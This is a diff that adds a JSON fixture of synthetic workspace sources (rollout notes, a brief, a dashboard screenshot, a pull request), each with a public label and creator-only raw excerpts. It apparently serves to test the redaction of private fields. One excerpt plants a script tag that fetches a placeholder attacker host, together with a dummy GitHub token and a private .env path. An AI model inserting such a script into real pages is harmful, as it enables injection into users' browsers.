@@ -1,0 +1,92 @@
+{
+  "schemaVersion": "1.0.0",
+  "workspaceId": "wsp_10000000-0000-4000-8000-000000000001",
+  "sources": [
+    {
+      "id": "src_30000000-0000-4000-8000-000000000001",
+      "workspaceId": "wsp_10000000-0000-4000-8000-000000000001",
+      "projectIds": [
+        "prj_20000000-0000-4000-8000-000000000001",
+        "prj_20000000-0000-4000-8000-000000000002",
+        "prj_20000000-0000-4000-8000-000000000003"
+      ],
+      "kind": "pasted-note",
+      "title": "Casey's unedited notes",
+      "publicLabel": "Rollout planning notes",
+      "observedAt": "2026-08-23T18:00:00Z",
+      "summary": "Mixed notes cover rollout decisions, a reconciliation outcome, an ambiguous activity, a next priority, and reusable operating knowledge.",
+      "creatorOnly": {
+        "locators": [
+          {
+            "kind": "local-path",
+            "value": "/Users/casey/Northstar/notes/week-2026-08-23.md"
+          }
+        ],
+        "rawExcerpt": "maybe finished permissions cleanup? <script>fetch('https://attacker.example.invalid')</script> ghp_fixture000000000000000000000000000000 /Users/casey/Northstar/private/reconciliation.env"
+      }
+    },
+    {
+      "id": "src_30000000-0000-4000-8000-000000000002",
+      "workspaceId": "wsp_10000000-0000-4000-8000-000000000001",
+      "projectIds": [
+        "prj_20000000-0000-4000-8000-000000000001"
+      ],
+      "kind": "local-file",
+      "title": "Enterprise rollout brief",
+      "publicLabel": "Enterprise rollout brief",
+      "observedAt": "2026-08-23T17:30:00Z",
+      "summary": "The pilot awaits data-retention review; staged cohorts protect support capacity and require a first-cohort decision by Friday.",
+      "creatorOnly": {
+        "locators": [
+          {
+            "kind": "local-path",
+            "value": "/Users/casey/Northstar/rollout/project-brief.md"
+          }
+        ],
+        "rawExcerpt": "The enterprise pilot cannot start until security completes the data-retention review."
+      }
+    },
+    {
+      "id": "src_30000000-0000-4000-8000-000000000003",
+      "workspaceId": "wsp_10000000-0000-4000-8000-000000000001",
+      "projectIds": [
+        "prj_20000000-0000-4000-8000-000000000002"
+      ],
+      "kind": "screenshot",
+      "title": "Synthetic reconciliation dashboard",
+      "publicLabel": "Replay benchmark dashboard",
+      "observedAt": "2026-08-22T14:15:00Z",
+      "summary": "The dashboard shows the 50,000-record replay completing in 6 minutes compared with an 18-minute baseline.",
+      "creatorOnly": {
+        "locators": [
+          {
+            "kind": "local-path",
+            "value": "/Users/casey/Northstar/screenshots/replay-dashboard.png"
+          }
+        ],
+        "rawExcerpt": "Synthetic screenshot: 50k record replay, 18m baseline, 6m current."
+      }
+    },
+    {
+      "id": "src_30000000-0000-4000-8000-000000000004",
+      "workspaceId": "wsp_10000000-0000-4000-8000-000000000001",
+      "projectIds": [
+        "prj_20000000-0000-4000-8000-000000000002"
+      ],
+      "kind": "github-pull-request",
+      "title": "Pull request 184",
+      "publicLabel": "Reconciliation checkpoint pull request",
+      "observedAt": "2026-08-21T16:42:00Z",
+      "summary": "The recorded synthetic pull request merged checkpoint batching with passing tests and benchmark checks.",
+      "creatorOnly": {
+        "locators": [
+          {
+            "kind": "url",
+            "value": "https://github.example.invalid/northstar-systems/reconciliation-service/pull/184"
+          }
+        ],
+        "rawExcerpt": "MERGED: Batch reconciliation checkpoints during replay; approved with successful checks."
+      }
+    }
+  ]
+}
